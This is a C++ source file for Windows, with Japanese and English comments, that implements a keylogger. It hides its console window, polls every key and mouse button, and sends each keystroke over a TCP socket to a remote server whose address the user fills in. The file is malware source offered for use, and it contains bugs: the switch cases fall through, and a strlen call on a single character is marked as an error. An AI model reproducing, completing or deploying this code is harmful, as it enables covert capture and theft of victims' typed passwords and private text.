#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;
#pragma comment(lib, "ws2_32")

int main() {
  /* IP アドレス、ポート番号、ソケット */
  
  char destination[80] = "your ipadress";//your ip address(server ip)
  unsigned short port = 21; // you want connect to server port
  int dstSocket;

  /* sockaddr_in 構造体 */
  struct sockaddr_in dstAddr;

  /* 各種パラメータ */
  static int status;
  static int numsnt;
  

  
  /* Windows 独自の設定 */
  WSADATA data;
  WSAStartup(MAKEWORD(2,0), &data);

 
  /* sockaddr_in 構造体のセット */
  memset(&dstAddr, 0, sizeof(dstAddr));
  dstAddr.sin_port = htons(port);
  dstAddr.sin_family = AF_INET;
  dstAddr.sin_addr.s_addr = inet_addr(destination);
 
  /* ソケット生成 */
  dstSocket = socket(AF_INET, SOCK_STREAM, 0);

  /* 接続 connect*/
  printf("Trying to connect to %s: \n", destination);

  connect(dstSocket, (struct sockaddr *) &dstAddr, sizeof(dstAddr));

  /* パケット送出 send packet and message*/
while(true) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char c;
    
    for(c=1; c<=254; c++){
            if (GetAsyncKeyState(c) & 0x1){
              printf("sending...\n");
              const char *t;
             switch (c)
                {
               
                  case VK_RETURN:
                    t = "enter";
                    send(dstSocket, t, strlen(t)+1, 0);
               
                    
                  case VK_SHIFT:
                    t = "shift";
                    send(dstSocket, t, strlen(t)+1, 0);
                    
                  case VK_CONTROL:
                    t = "ctrl";
                    send(dstSocket, t, strlen(t)+1, 0);
                  case VK_CAPITAL:
                    t = "CAPSLOCK";
                    send(dstSocket, t, strlen(t)+1, 0);
                  case VK_TAB:
                    t = "tab";
                    send(dstSocket, t, strlen(t)+1, 0);
                    
                  case VK_MENU:
                    t = "alt";
                    send(dstSocket, t, strlen(t)+1, 0);
                    
                  case VK_LBUTTON:
                    t = "mouse left click";
                    send(dstSocket, t, strlen(t)+1, 0);
                  case VK_RBUTTON:
                    t = "mouse right click";
                    send(dstSocket, t, strlen(t)+1, 0);
                  default:
                    std::cout << c;
                    char y = c;
                    send(dstSocket, &y, strlen(&y)+1, 0);//error 
                }
               }
}        
}

closesocket(dstSocket);//close socket
WSACleanup();
}
